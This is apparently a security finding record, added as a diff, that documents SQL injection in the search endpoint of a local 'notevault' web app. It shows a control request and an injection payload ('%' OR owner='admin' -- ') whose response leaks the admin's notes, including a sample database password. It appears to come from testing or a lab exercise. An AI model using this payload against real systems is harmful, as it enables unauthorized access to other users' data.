@@ -1,0 +1,33 @@
+Finding: F-05 - SQL injection in search
+Date: 2026-11-02T00:44:07.9195410+07:00
+Git commit: 11c3264638fe5e0549994810f81c5586f5524db2
+Target: GET http://localhost:8080/search
+
+Control request:
+URL: http://localhost:8080/search?q=milk
+Authenticated user: alice
+Observed response:
+C:\Users\DELL\AppData\Local\Temp\notevault-search-normal-headers.txt:1:HTTP/1.0 200 OK
+Expected: Alice's matching notes only
+Observed body excerpt:
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 57
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:43:18 GMT
+
+<a href=/>back</a><ul><li>groceries: milk, eggs</li></ul>
+
+Exploit request:
+Payload: %' OR owner='admin' -- [trailing space included]
+Observed response:
+C:\Users\DELL\AppData\Local\Temp\notevault-search-injection-headers.txt:1:HTTP/1.0 200 OK
+Expected secure result: Alice's matching notes only
+Observed body excerpt:
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 159
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:43:36 GMT
+
+<a href=/>back</a><ul><li>groceries: milk, eggs</li><li>infra: prod db password is hunter2</li><li>build-tag: team=team-bits-2026 marker=e32f856268b3</li></ul>
